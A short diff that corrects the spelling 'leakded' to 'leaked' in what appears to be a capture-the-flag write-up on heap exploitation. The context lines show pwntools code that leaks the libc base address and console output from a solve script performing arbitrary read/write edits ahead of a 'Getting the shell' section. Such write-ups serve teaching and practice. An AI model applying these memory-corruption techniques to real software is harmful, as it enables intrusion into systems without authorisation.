@@ -275,7 +275,7 @@ leak = read(elf.symbols['stdout@@GLIBC_2.2.5'])
 if not leak:
     log.error('Libc address leak failed')
 libc.address = leak - libc.symbols['_IO_2_1_stdout_']
-log.success('Libc base address leakded: 0x%X', libc.address)
+log.success('Libc base address leaked: 0x%X', libc.address)
 ```
 
 ### Getting the shell
@@ -324,7 +324,7 @@ $ ./solve.py
 [+] Arbitrary read write init done
 [*] Edit [13] = 0x404010
 [*] Edit [12] = b'A'
-[+] Libc base address leakded: 0x7FED27F88000
+[+] Libc base address leaked: 0x7FED27F88000
 [*] Edit [13] = 0x7FED28176E48
 [*] Edit [12] = 0x7FED27FDA2C0
 [*] Free [15]
